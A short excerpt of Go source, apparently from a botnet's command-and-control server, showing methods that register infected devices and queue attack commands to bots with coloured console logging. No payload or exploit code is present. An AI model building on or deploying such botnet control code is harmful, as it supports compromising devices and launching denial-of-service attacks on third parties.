...
func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
    fmt.Printf("\033[1;36m[\033[0:37m\033[1;36m]\033[0:32m Device \033[1;31mInfected\033[1;36m [\033[1;33m%s\033[1;36m]\033[1;35m Device \033[1;36mType\033[1;36m [\033[1:32m%s\033[1;36m]\n", c.conn.RemoteAddr(), c.source)
}
...
func (this ClientList) QueueBuf(buf []byte, maxbots int, botCata string, username string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
    fmt.Printf("\n\033[01;31m[] \x1b[1;36m%s \033[01;31mSent an attack\033[0m\r\n", username)
}
